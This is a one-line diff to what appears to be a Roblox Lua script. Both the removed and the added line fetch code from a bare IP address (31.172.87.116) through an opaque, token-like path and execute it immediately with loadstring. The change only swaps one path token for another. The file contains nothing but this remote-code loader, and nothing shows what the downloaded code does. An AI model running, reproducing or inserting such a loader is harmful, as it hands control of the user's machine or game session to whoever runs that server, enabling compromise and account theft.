@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://31.172.87.116/qO9MSjFWzIcriOYAUwJBnaUJyPYjPX5TL9RTl9W8gcK3IW7FaxVbXX5bQh5GtEg3C1TBFzXbtjNAVCo7"))()
+loadstring(game:HttpGet("http://31.172.87.116/MCHXIAKQOD1yz8TOaeOis8mQkKvn0gmEpGWd2tHNO4OT4yatOwD30Vt8zaBvrA02NTi78siepS00rxmU"))()
